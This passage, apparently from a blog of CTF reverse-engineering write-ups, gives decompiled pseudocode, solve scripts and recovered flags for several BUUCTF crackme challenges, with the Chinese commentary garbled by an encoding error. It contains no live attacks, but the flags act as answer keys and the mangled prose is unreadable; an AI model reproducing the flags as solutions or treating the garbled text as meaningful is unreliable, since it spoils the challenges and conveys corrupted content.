lstrcatA(lpString1, String2); } CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); result = 1; } else { CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); result = 0; } } else { CryptReleaseContext(phProv, 0); result = 0; } return result; } sha1æ˜¯å•å‘æ•£åˆ—å‡½æ•°ï¼Œæ²¡æ³•é€†ï¼Œå¹¸å¥½æ˜¯6ä½æ•°å­—ï¼Œç›´æ¥çˆ†ç ´æ‹¿åˆ°å¯†ç 123321 import hashlib for i in range(100000,999999): sha1 = hashlib.sha1() inp = str(i) + \"@DBApp\" sha1.update(inp.encode(\"utf-8\")) if sha1.hexdigest().lower() == \"6E32D0943418C2C33385BC35A1470250DD8923A9\".lower(): print(i) # outputï¼š123321 åŒç†ç¬¬äºŒä¸ªåŠ å¯†ç®—æ³•å¯çŸ¥ä¸ºmd5ï¼Œä½†æ²¡æœ‰é™å®šä¸ºæ•°å­—ï¼Œè¯•äº†è¯•6ä½æ•°å­—çˆ†ç ´æ²¡æœ‰ç»“æœï¼Œ6ä½å…¨å­—ç¬¦çˆ†ç ´ä¸ç°å® ç»§ç»­å¾€ä¸‹çœ‹sub_40100Fä¼ å‚è°ƒç”¨äº†è¾“å…¥çš„str //sub_40100Fä¸­åµŒå¥—äº†sub_4014D0 char __cdecl sub_4014D0(LPCSTR lpString) { LPCVOID lpBuffer; // [esp+50h] [ebp-1Ch] DWORD NumberOfBytesWritten; // [esp+58h] [ebp-14h] BYREF DWORD nNumberOfBytesToWrite; // [esp+5Ch] [ebp-10h] HGLOBAL hResData; // [esp+60h] [ebp-Ch] HRSRC hResInfo; // [esp+64h] [ebp-8h] HANDLE hFile; // [esp+68h] [ebp-4h] hFile = 0; hResData = 0; nNumberOfBytesToWrite = 0; NumberOfBytesWritten = 0; hResInfo = FindResourceA(0, (LPCSTR)0x65, \"AAA\");// Resource-Hackerçœ‹èµ„æº if ( !hResInfo ) return 0; nNumberOfBytesToWrite = SizeofResource(0, hResInfo); hResData = LoadResource(0, hResInfo); if ( !hResData ) return 0; lpBuffer = LockResource(hResData); sub_401005(lpString, (int)lpBuffer, nNumberOfBytesToWrite);// å’ŒlpStringå¼‚æˆ–å¾—åˆ°lpbuffer hFile = CreateFileA(\"dbapp.rtf\", 0x10000000u, 0, 0, 2u, 0x80u, 0); if ( hFile == (HANDLE)-1 ) return 0; if ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, \u0026NumberOfBytesWritten, 0) ) return 0; CloseHandle(hFile); return 1; } sub_401005å‡½æ•°å†…éƒ¨è¿›è¡Œé€ä½å¼‚æˆ– //sub_401005å†…éƒ¨åµŒå¥—sub_401420 void __cdecl sub_401420(LPCSTR lpString, char *_8, int _C) { unsigned int i; // [esp+4Ch] [ebp-Ch] unsig","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:1:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[2019çº¢å¸½æ¯]easyRE å‚è€ƒå®˜æ–¹wpï¼Œè¿™çœŸæ˜¯é“çœ¼åŠ›é¢˜ã€‚ã€‚ è¿›idaï¼Œé¦–å…ˆçœ‹åˆ°startå‡½æ•°ï¼Œå•¥ä¹Ÿä¸æ˜¯ï¼Œç¿»stringçª—å£ï¼Œå¾ˆæ˜¾çœ¼çš„You found meï¼Œè·Ÿè¿›å» __int64 sub_4009C6() { __int64 result; // rax int i; // [rsp+Ch] [rbp-114h] __int64 v2; // [rsp+10h] [rbp-110h] __int64 v3; // [rsp+18h] [rbp-108h] __int64 v4; // [rsp+20h] [rbp-100h] __int64 v5; // [rsp+28h] [rbp-F8h] __int64 v6; // [rsp+30h] [rbp-F0h] __int64 v7; // [rsp+38h] [rbp-E8h] __int64 v8; // [rsp+40h] [rbp-E0h] __int64 v9; // [rsp+48h] [rbp-D8h] __int64 v10; // [rsp+50h] [rbp-D0h] __int64 v11; // [rsp+58h] [rbp-C8h] char v12[36]; // [rsp+60h] [rbp-C0h] BYREF char input1[32]; // [rsp+90h] [rbp-90h] BYREF int v14; // [rsp+B0h] [rbp-70h] char v15; // [rsp+B4h] [rbp-6Ch] char input2[72]; // [rsp+C0h] [rbp-60h] BYREF unsigned __int64 v17; // [rsp+108h] [rbp-18h] v17 = __readfsqword(0x28u); qmemcpy(v12, \"Iodl\u003eQnb(ocy\", 12); v12[12] = 127; qmemcpy(\u0026v12[13], \"y.i\", 3); v12[16] = 127; qmemcpy(\u0026v12[17], \"d`3w}wek9{iy=~yL@EC\", 19); memset(input1, 0, sizeof(input1)); v14 = 0; v15 = 0; Read(0, input1, 0x25uLL); v15 = 0; if ( _strlen_sse2(input1) == 36 ) { for ( i = 0; i \u003c (unsigned __int64)_strlen_sse2(input1); ++i ) { if ( (unsigned __int8)(input1[i] ^ i) != v12[i] ) { result = 4294967294LL; goto LABEL_13; } } puts(\"continue!\"); memset(input2, 0, 0x40uLL); input2[64] = 0; Read(0, input2, 0x40uLL); input2[39] = 0; if ( _strlen_sse2(input2) == 39 ) { v2 = Base64enc(input2); v3 = Base64enc(v2); v4 = Base64enc(v3); v5 = Base64enc(v4); v6 = Base64enc(v5); v7 = Base64enc(v6); v8 = Base64enc(v7); v9 = Base64enc(v8); v10 = Base64enc(v9); v11 = Base64enc(v10); if ( !(unsigned int)Strcmp(v11, off_6CC090) ) { puts(\"You found me!!!\"); puts(\"bye bye~\"); } result = 0LL; } else { result = 4294967293LL; } } else { result = 0xFFFFFFFFLL; } LABEL_13: if ( __readfsqword(0x28u) != v17 ) sub_444020(); return result; } ä¸¤æ¬¡è¾“å…¥ï¼Œä¸¤æ¬¡åŠ å¯†æ¯”è¾ƒï¼Œéƒ½å¾ˆå¸¸è§„ ç¬¬ä¸€ä¸ªå¼‚æˆ–è§£å¯† enc1 = \"Iodl\u003eQnb(ocy\" + chr(127) + \"y.i\" + chr(127) + \"d`3w}wek9{iy=~yL@EC\" print(len(enc1)) for i in range(36): print(chr(ord(enc1[i]) ^ i),end=\"\") #outputï¼š Info:The first four chars are `flag` ç¬¬äºŒä¸ªå¯ä»¥çœ‹å‡ºæ¥æ˜¯base64åŠ å¯†äº†10éï¼Œè§£å¯†å¾—åˆ°https://bbs.pediy.com/thread-254172.htmï¼Œç„¶åå¯„ï¼ ç¿»å„ç§å¥‡å¥‡æ€ªæ€ªçš„ç³»ç»Ÿå‡½æ•°å®ç°ï¼Œä¹Ÿæ²¡çœ‹å‡ºæ¥ä¸ªæ‰€ä»¥ç„¶ï¼Œçœ‹äº†çœ‹wp,å…¶å®ä¸Šé¢æ–‡ç« ä¸­ä¹Ÿæœ‰æç¤ºï¼Œä½†æˆ‘ä¹Ÿæ²¡è®¤çœŸçœ‹ï¼ˆï¼ˆ åœ¨ç¬¬äºŒæ¬¡åŠ å¯†åæ¯”è¾ƒçš„å­—ç¬¦ä¸²ä½ç½®åé¢ï¼Œè¿˜å­˜ç€ä¸€ä¸ªè§„å¾‹çš„å­—ç¬¦ä¸² æŸ¥äº¤å‰å¼•ç”¨å®šä½å‡½æ•°sub_400D35 unsigned __int64 sub_400D35() { unsigned __int64 result; // rax unsigned int v1; // [rsp+Ch] [rbp-24h] int i; // [rsp+10h] [rbp-20h] int j; // [rsp+14h] [rbp-1Ch] unsigned int key; // [rsp+24h] [rbp-Ch] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v1 = sub_43FD20(0LL) - qword_6CEE38; for ( i = 0; i \u003c= 1233; ++i ) { sub_40F790(v1); sub_40FE60(); sub_40FE60(); v1 = sub_40FE60() ^ 0x98765432; } key = v1; if ( ((unsigned __int8)v1 ^ a5VENbThlNr2e[0]) == 'f' \u0026\u0026 (HIBYTE(key) ^ a5VENbThlNr2e[3]) == 'g' ) { for ( j = 0; j \u003c= 24; ++j ) putchar((unsigned __int8)(a5VENbThlNr2e[j] ^ *((_BYTE *)\u0026key + j % 4))); } result = __readfsqword(0x28u) ^ v5; if ( result ) sub_444020(); return result; } ç¬¬ä¸€æ¬¡å¼‚æˆ–å¾—åˆ°å‰å››ä½ä¸ºflagï¼Œç¬¬äºŒæ¬¡å¼‚æˆ–è¾“å‡ºflag en_flag = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B, 0x00] chars = \"flag\" key = [0]*4 for i in range(4): key[i] = en_flag[i] ^ ord(chars[i]) for i in range(26): print(chr(en_flag[i] ^ key[i%4]),end=\"\") #outputï¼šflag{Act1ve_Defen5e_Test} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:2:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[FlareOn4]login è§£å‹å‹ç¼©åŒ…å¾—åˆ°ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œæºç å¦‚ä¸‹ \u003c!DOCTYPE Html /\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eFLARE On 2017\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cinput type=\"text\" name=\"flag\" id=\"flag\" value=\"Enter the flag\" /\u003e \u003cinput type=\"button\" id=\"prompt\" value=\"Click to check the flag\" /\u003e \u003cscript type=\"text/javascript\"\u003e document.getElementById(\"prompt\").onclick = function () { var flag = document.getElementById(\"flag\").value; var rotFlag = flag.replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c \u003c= \"Z\" ? 90 : 122) \u003e= (c = c.charCodeAt(0) + 13) ? c : c - 26);}); if (\"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz\" == rotFlag) { alert(\"Correct flag!\"); } else { alert(\"Incorrect flag, rot again\"); } } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e è®¡ç®—rotFlagå±äºæ˜¯æè‡´çš„å‹è¡Œäº†ï¼Œä¸ºçš„å°±æ˜¯è®©äººè¿·ç³Šçœ‹ä¸æ‡‚ï¼Œç¿»è¯‘æˆpyå¤§æ¦‚é•¿è¿™æ · flag = \"plain_text\" for i in range(36): if(flag[i] \u003c= \"Z\"): t = 90 else: t = 122 flag[i] = chr(ord(flag[i]) + 13) if(t \u003c flag[i]): flag[i] -= 26 flagæ‰€æœ‰ä½ä¼šå…ˆåŠ ä¸Š13ï¼Œç„¶åå¦‚æœç¬¦åˆifæ¡ä»¶ä¼šå†å‡26 è¦æƒ³å®Œå…¨ç†æ¸…æ¥šä¸€ä½ä¸€ä½é€†å›å»å¾ˆéº»çƒ¦ï¼Œä½†æ€»çš„æ¥è¯´é€†å›å»è¦ä¹ˆåŠ 13è¦ä¹ˆå‡13 ç›²çŒœflagæ˜¯æœ‰æ„ä¹‰çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘æŠŠå¯èƒ½çš„æƒ…å†µå…¨åˆ—å‡ºæ¥ï¼ˆä¸€ä½ä¸¤ç§å¯èƒ½ï¼‰ï¼Œäººå·¥æŒ‘é€‰æ­£ç¡®ç­”æ¡ˆ en_flag = \"PyvragFvqrYbtvafNerRnfl@syner-ba.pbz\" for i in en_flag: if(i.isalpha() == False):#åªæ›¿æ¢flagä¸­çš„å­—æ¯ print(i) continue if(ord(i)+ 13 \u003c= 126):#åŠ è¿™ä¸ªåˆ¤æ–­æ˜¯å› ä¸ºå¦‚æœè¶…å‡ºå¯è§å­—ç¬¦ï¼Œæ— æ³•è¾“å‡ºåˆ™æ’åˆ—ä¼šå¾ˆéš¾çœ‹ print(chr(ord(i)+13),end=\" \") print(chr(ord(i)-13)) ç¨‹åºè¾“å‡º ] C l i e n T t Z S 9 i ~ d e f L o U g i n T s Y [ A r X e _ E { a s Y y _ @ f l { a r X e - o U n T . } c o U m å…¶ä¸­å¦‚æœæŸä¸€è¡Œæ—¢æœ‰å­—æ¯åˆæœ‰éå­—æ¯ï¼Œå¯ä»¥ç›´æ¥èˆå¼ƒéå­—æ¯ï¼Œå› ä¸ºéå­—æ¯å¼€å§‹å°±ä¸ä¼šè¢«æ›¿æ¢ ä»”ç»†çœ‹ä¸€ä¼šï¼Œå¾—åˆ°flag{ClientSideLoginsAreEasy@flare-on.com} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:3:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[GUET-CTF2019]re æ‹–å…¥idaå‘ç°å‡½æ•°å¾ˆå°‘ï¼Œæ„Ÿè§‰æœ‰å£³ï¼Œæœç„¶æ˜¯upxï¼Œå…ˆè„±å£³ç„¶åå†è¿›ida ä¸»è¦å‡½æ•° __int64 __fastcall sub_400E28(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6) { __int64 result; // rax __int64 v7; // [rsp+0h] [rbp-30h] BYREF unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); Printf((__int64)\"input your flag:\", a2, a3, a4, a5, a6, 0LL, 0LL, 0LL, 0LL); Scanf((__int64)\"%s\", \u0026v7); if ( sub_4009AE((char *)\u0026v7) ) puts(\"Correct!\"); else puts(\"Wrong!\"); result = 0LL; if ( __readfsqword(0x28u) != v8 ) sub_443550(); return result; } ä¸»è¦åŠ å¯†åœ¨sub_4009AE _BOOL8 __fastcall sub_4009AE(char *a1) { if ( 1629056 * *a1 != 166163712 ) return 0LL; if ( 6771600 * a1[1] != 731332800 ) return 0LL; if ( 3682944 * a1[2] != 357245568 ) return 0LL; if ( 10431000 * a1[3] != 1074393000 ) return 0LL; if ( 3977328 * a1[4] != 489211344 ) return 0LL; if ( 5138336 * a1[5] != 518971936 ) return 0LL; if ( 7532250 * a1[7] != 406741500 ) return 0LL; if ( 5551632 * a1[8] != 294236496 ) return 0LL; if ( 3409728 * a1[9] != 177305856 ) return 0LL; if ( 13013670 * a1[10] != 650683500 ) return 0LL; if ( 6088797 * a1[11] != 298351053 ) return 0LL; if ( 7884663 * a1[12] != 386348487 ) return 0LL; if ( 8944053 * a1[13] != 438258597 ) return 0LL; if ( 5198490 * a1[14] != 249527520 ) return 0LL; if ( 4544518 * a1[15] != 445362764 ) return 0LL; if ( 3645600 * a1[17] != 174988800 ) return 0LL; if ( 10115280 * a1[16] != 981182160 ) return 0LL; if ( 9667504 * a1[18] != 493042704 ) return 0LL; if ( 5364450 * a1[19] != 257493600 ) return 0LL; if ( 13464540 * a1[20] != 767478780 ) return 0LL; if ( 5488432 * a1[21] != 312840624 ) return 0LL; if ( 14479500 * a1[22] != 1404511500 ) return 0LL; if ( 6451830 * a1[23] != 316139670 ) return 0LL; if ( 6252576 * a1[24] != 619005024 ) return 0LL; if ( 7763364 * a1[25] != 372641472 ) return 0LL; if ( 7327320 * a1[26] != 373693320 ) return 0LL; if ( 8741520 * a1[27] != 498266640 ) return 0LL; if ( 8871876 * a1[28] != 452465676 ) return 0LL; if ( 4086720 * a1[29] != 208422720 ) return 0LL; if ( 9374400 * a1[30] == 515592000 ) return 5759124 * a1[31] == 719890500; return 0LL; } ä¸Šz3æå®ƒ from z3 import * s = z3.Solver() a1 = [Int('a1[%d]' % i) for i in range(32)] s.add(1629056 * a1[0] == 166163712) s.add(6771600 * a1[1] == 731332800) s.add(3682944 * a1[2] == 357245568) s.add(10431000 * a1[3] == 1074393000) s.add(3977328 * a1[4] == 489211344) s.add(5138336 * a1[5] == 518971936) s.add(7532250 * a1[7] == 406741500) s.add(5551632 * a1[8] == 294236496) s.add(3409728 * a1[9] == 177305856) s.add(13013670 * a1[10] == 650683500) s.add(6088797 * a1[11] == 298351053) s.add(7884663 * a1[12] == 386348487) s.add(8944053 * a1[13] == 438258597) s.add(5198490 * a1[14] == 249527520) s.add(4544518 * a1[15] == 445362764) s.add(3645600 * a1[17] == 174988800) s.add(10115280 * a1[16] == 981182160) s.add(9667504 * a1[18] == 493042704) s.add(5364450 * a1[19] == 257493600) s.add(13464540 * a1[20] == 767478780) s.add(5488432 * a1[21] == 312840624) s.add(14479500 * a1[22] == 1404511500) s.add(6451830 * a1[23] == 316139670) s.add(6252576 * a1[24] == 619005024) s.add(7763364 * a1[25] == 372641472) s.add(7327320 * a1[26] == 373693320) s.add(8741520 * a1[27] == 498266640) s.add(8871876 * a1[28] == 452465676) s.add(4086720 * a1[29] == 208422720) s.add(9374400 * a1[30] == 515592000) s.add(5759124 * a1[31] == 719890500) s.check() print(s.model()) æ‰“å°flag a1 = [0] * 32 a1[31] = 125 a1[30] = 55 a1[29] = 51 a1[28] = 51 a1[27] = 57 a1[26] = 51 a1[25] = 48 a1[24] = 99 a1[23] = 49 a1[22] = 97 a1[21] = 57 a1[20] = 57 a1[19] = 48 a1[18] = 51 a1[16] = 97 a1[17] = 48 a1[15] = 98 a1[14] = 48 a1[13] = 49 a1[12] = 49 a1[11] = 49 a1[10] = 50 a1[9] = 52 a1[8] = 53 a1[7] = 54 a1[5] = 101 a1[4] = 123 a1[3] = 103 a1[2] = 97 a1[1] = 108 a1[0] = 102 for i in range(32): print(chr(a1[i]),end=\"\") è¿™é‡Œæœ‰ä¸¤ä¸ªå°é—®é¢˜ ä¼ªä»£ç ä¸­16ã€17ä¸¤ä½é¡ºåºåäº†ï¼Œä½†å› ä¸ºz3æçš„æ—¶å€™æ˜¯é¡ºç€å‘½åæœªçŸ¥æ•°çš„ï¼Œæ‰€ä»¥åä¸ŠåŠ åç­‰äºé¡ºåºæ­£ç¡®ï¼Œä¸ç”¨ä¿®æ”¹ å¦ä¸€ç‚¹å°±æ˜¯ç¬¬6ä½ç¼ºå¤±ï¼Œå¹¶æœªè¿›è¡Œåˆ¤æ–­ï¼Œå®æµ‹æ— è®ºç¬¬6ä½æ˜¯ä»€ä¹ˆï¼Œæºç¨‹åºéƒ½ä¼šè¾“å‡ºCorrectï¼ï¼Œåº”è¯¥æ˜¯å¤šè§£ï¼Œä½†æ— å¥ˆbuuå¹³å°ä¸Šåªè®¤ç¬¬6ä½ä¸º1 æ•…flag{e165421110ba03099a1c039337} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:4:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[SUCTF2019]SignIn è¿›idaçœ‹åˆ°mainå‡½æ•° __int64 __fastcall main(int a1, char **a2, char **a3) { char v4[16]; // [rsp+0h] [rbp-4A0h] BYREF char v5[16]; // [rsp+10h] [rbp-490h] BYREF char v6[16]; // [rsp+20h] [rbp-480h] BYREF char code[16]; // [rsp+30h] [rbp-470h] BYREF char v8[112]; // [rsp+40h] [rbp-460h] BYREF char v9[1000]; // [rsp+B0h] [rbp-3F0h] BYREF unsigned __int64 v10; // [rsp+498h] [rbp-8h] v10 = __readfsqword(0x28u); puts(\"[sign in]\"); printf(\"[input your flag]: \"); __isoc99_scanf(\"%99s\", v8); sub_96A(v8, v9); __gmpz_init_set_str(code, \"ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\", 16LL); __gmpz_init_set_str(v6, v9, 16LL); __gmpz_init_set_str(v4, \"103461035900816914121390101299049044413950405173712170434161686539878160984549\", 10LL); __gmpz_init_set_str(v5, \"65537\", 10LL); __gmpz_powm(v6, v6, v5, v4); if ( (unsigned int)__gmpz_cmp(v6, code) ) puts(\"GG!\"); else puts(\"TTTTTTTTTTql!\"); return 0LL; } æ ‡å‡†çš„ç”¨gmpåº“å®ç°çš„RSAç®—æ³• å‚è€ƒgmpy2å¸¸è§å‡½æ•°ä½¿ç”¨ RSAç®—æ³•åŸç† åˆ©ç”¨gmpy2åº“è§£å‡ºflag import gmpy2 from Crypto.Util.number import * n = 103461035900816914121390101299049044413950405173712170434161686539878160984549 p = 282164587459512124844245113950593348271 q = 366669102002966856876605669837014229419 code = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 e = 65537 l = (p-1)*(q-1) d = gmpy2.invert(e,l) flag = gmpy2.powmod(code,d,n) print(long_to_bytes(flag)) #outputï¼šb'suctf{Pwn_@_hundred_years}' ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:6:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[WUSTCTF2020]level1 mainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+4h] [rbp-2Ch] FILE *stream; // [rsp+8h] [rbp-28h] char ptr[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); stream = fopen(\"flag\", \"r\"); fread(ptr, 1uLL, 0x14uLL, stream); fclose(stream); for ( i = 1; i \u003c= 19; ++i ) { if ( (i \u0026 1) != 0 ) printf(\"%ld\\n\", (unsigned int)(ptr[i] \u003c\u003c i)); else printf(\"%ld\\n\", (unsigned int)(i * ptr[i])); } return 0; } æœ‰å¼ºè½¬ç›´æ¥é€†ä¸å¤ªä¿é™©ï¼Œæ­£ç€ç›´æ¥çˆ†å‡ºæ¥ #include\u003cstdio.h\u003e int main(){ unsigned int en_flag[] = {0,198,232,816,200,1536,300,6144,984,51200,570,92160,1200,565248,756,1474560,800,6291456,1782,65536000}; char flag[19] = {0}; for(int i = 1;i \u003c= 19; i++){ for(int j = 32; j \u003c= 126; j++){ unsigned int t; if(i \u0026 1 != 0) t = (unsigned int)(j \u003c\u003c i); else t = (unsigned int)(j * i); if(t == en_flag[i]) flag[i] = j; } printf(\"%c\",flag[i]); } } //outputï¼šctf2020{d9-dE6-20c} ï¼ˆè¿™ä¸¤å¤©é¢˜å’‹è¶Šåšè¶Šç®€å•äº†ï¼Œï¼Œ ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:7:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[MRCTF2020]Transform è¿›idaå°±èƒ½çœ‹åˆ°mainå‡½æ•°ï¼Œç®€å•æ”¹ä¸€ä¸‹å˜é‡å int __cdecl main(int argc, const char **argv, const char **envp) { char Str[104]; // [rsp+20h] [rbp-70h] BYREF int j; // [rsp+88h] [rbp-8h] int i; // [rsp+8Ch] [rbp-4h] sub_402230(argc, argv, envp); Printf(\"Give me your code:\\n\"); Scanf(\"%s\", Str); if ( strlen(Str) != 33 ) { Printf(\"Wrong!\\n\"); system(\"pause\"); exit(0); } for ( i = 0; i \u003c= 32; ++i ) { en_flag[i] = Str[index[i]]; en_flag[i] ^= LOBYTE(index[i]); } for ( j = 0; j \u003c= 32; ++j ) { if ( byte_40F0E0[j] != en_flag[j] ) { Printf(\"Wrong!\\n\"); system(\"pause\"); exit(0); } } Printf(\"Right!Good Job!\\n\"); Printf(\"Here is your flag: %s\\n\", Str); system(\"pause\"); return 0; } ç›´æ¥é€†æ‹¿flag index = [ 0x09, 0x0A, 0x0F, 0x17, 0x07, 0x18, 0x0C, 0x06, 0x01, 0x10, 0x03, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16, 0x04, 0x0D, 0x13, 0x14, 0x15, 0x02, 0x19, 0x05, 0x1F, 0x08, 0x12, 0x1A, 0x1C, 0x0E,0] en_flag = [ 0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A, 0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D] flag = [0] * 33 for i in range(0,33): en_flag[i] ^= index[i] flag[index[i]] = en_flag[i] for i in flag: print(chr(i), end = \"\") #outputï¼šMRCTF{Tr4nsp0sltiON_Clph3r_1s_3z} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:8:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[ACTFæ–°ç”Ÿèµ›2020]usualCrypt è¿›idaçœ‹mainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // esi int result; // eax int v5[3]; // [esp+8h] [ebp-74h] BYREF __int16 v6; // [esp+14h] [ebp-68h] char v7; // [esp+16h] [ebp-66h] char v8[100]; // [esp+18h] [ebp-64h] BYREF printf(asc_40E140); scanf(\"%s\", v8); v5[0] = 0; v5[1] = 0; v5[2] = 0; v6 = 0; v7 = 0; encrypt((int)v8, strlen(v8), (int)v5); v3 = 0; while ( *((_BYTE *)v5 + v3) == enc[v3] ) { if ( ++v3 \u003e strlen((const char *)v5) ) goto LABEL_6; } printf(\"error!\\n\"); LABEL_6: if ( v3 - 1 == strlen(enc) ) result = printf(\"Are you happy?yes!\\n\"); else result = printf(\"Are you happy?No!\\n\"); return result; } encryptå‡½æ•° void __cdecl encrypt(int a1, int a2, int a3) { int v3; // edi int v4; // esi int v5; // edx int v6; // eax int v7; // ecx int v8; // esi int v9; // esi int v10; // esi int v11; // esi _BYTE *v12; // ecx int v13; // esi int a2a; // [esp+18h] [ebp+8h] v3 = 0; v4 = 0; changeTable(); // base64æ¢è¡¨ v5 = a2 % 3; v6 = a1; v7 = a2 - a2 % 3; a2a = a2 % 3; if ( v7 \u003e 0 ) { do { LOBYTE(v5) = *(_BYTE *)(a1 + v3); v3 += 3; v8 = v4 + 1; *(_BYTE *)(v8 + a3 - 1) = aAbcdefghijklmn[(v5 \u003e\u003e 2) \u0026 0x3F]; *(_BYTE *)(++v8 + a3 - 1) = aAbcdefghijklmn[16 * (*(_BYTE *)(a1 + v3 - 3) \u0026 3) + (((int)*(unsigned __int8 *)(a1 + v3 - 2) \u003e\u003e 4) \u0026 0xF)]; *(_BYTE *)(++v8 + a3 - 1) = aAbcdefghijklmn[4 * (*(_BYTE *)(a1 + v3 - 2) \u0026 0xF) + (((int)*(unsigned __int8 *)(a1 + v3 - 1) \u003e\u003e 6) \u0026 3)]; v5 = *(_BYTE *)(a1 + v3 - 1) \u0026 0x3F; v4 = v8 + 1; *(_BYTE *)(v4 + a3 - 1) = aAbcdefghijklmn[v5]; } while ( v3 \u003c v7 ); v5 = a2a; } if ( v5 == 1 ) { LOBYTE(v7) = *(_BYTE *)(v3 + a1); v9 = v4 + 1; *(_BYTE *)(v9 + a3 - 1) = aAbcdefghijklmn[(v7 \u003e\u003e 2) \u0026 0x3F]; v10 = v9 + 1; *(_BYTE *)(v10 + a3 - 1) = aAbcdefghijklmn[16 * (*(_BYTE *)(v3 + a1) \u0026 3)]; *(_BYTE *)(v10 + a3) = 61; LABEL_8: v13 = v10 + 1; *(_BYTE *)(v13 + a3) = 61; v4 = v13 + 1; goto LABEL_9; } if ( v5 == 2 ) { v11 = v4 + 1; *(_BYTE *)(v11 + a3 - 1) = aAbcdefghijklmn[((int)*(unsigned __int8 *)(v3 + a1) \u003e\u003e 2) \u0026 0x3F]; v12 = (_BYTE *)(v3 + a1 + 1); LOBYTE(v6) = *v12; v10 = v11 + 1; *(_BYTE *)(v10 + a3 - 1) = aAbcdefghijklmn[16 * (*(_BYTE *)(v3 + a1) \u0026 3) + ((v6 \u003e\u003e 4) \u0026 0xF)]; *(_BYTE *)(v10 + a3) = aAbcdefghijklmn[4 * (*v12 \u0026 0xF)]; goto LABEL_8; } LABEL_9: *(_BYTE *)(v4 + a3) = 0; switch((const char *)a3); // å¤§å°å†™è½¬æ¢ } å‡ºé¢˜äººåœ¨å¯’é¡ºçš„å¼€å¤´å’Œç»“å°¾è€äº†ä¸€ç‚¹å°å¿ƒæ€ ä¸Šé¢å…ˆç®€å•çš„æ¢äº†ä¸ªbase64çš„è¡¨ï¼Œä¸‹é¢æŠŠbase64ç¼–ç åçš„å­—ç¬¦ä¸²ä¸­çš„å­—æ¯è¿›è¡Œå¤§å°å†™è½¬æ¢ æœ€ç»ˆå¾—åˆ°çš„å­—ç¬¦ä¸²ä¸å·²çŸ¥å­—ç¬¦ä¸²æ¯”è¾ƒ å†™è„šæœ¬æ‹¿flag import base64 enc = \"zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9\" ch = \"\" for i in enc: if(ord(i) \u003c 97 or ord(i) \u003e 122): if(ord(i) \u003c 65 or ord(i) \u003e 90): ch += i continue ch += chr(ord(i) + 32) else: ch += chr(ord(i) - 32) old_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" new_table = \"ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/\" table = str.maketrans(old_table, new_table) print(base64.b64decode(ch.translate(table))) #outputï¼šb'flag{bAse64_h2s_a_Surprise}' ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:9:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"Youngter-drive å‚è€ƒg0ul4shçš„wpï¼Œå¤§ä½¬å†™å¾—å¾ˆè¯¦ç»†ï¼Œå­¦åˆ°å¾ˆå¤š æ€»çš„æ¥è¯´ï¼Œè¿™æ˜¯ä¸€é“å¾ˆæœ‰æ„æ€çš„é¢˜ å…ˆè¦è„±upxå£³ï¼Œç„¶åæ‹–è¿›idaï¼Œmainå‡½æ•° int __cdecl main_0(int argc, const char **argv, const char **envp) { void *v3; // ecx HANDLE v5; // [esp+D0h] [ebp-14h] HANDLE hObject; // [esp+DCh] [ebp-8h] ini(v3); ::hObject = CreateMutexW(0, 0, 0); j_strcpy(Destination, (const char *)Source); hObject = 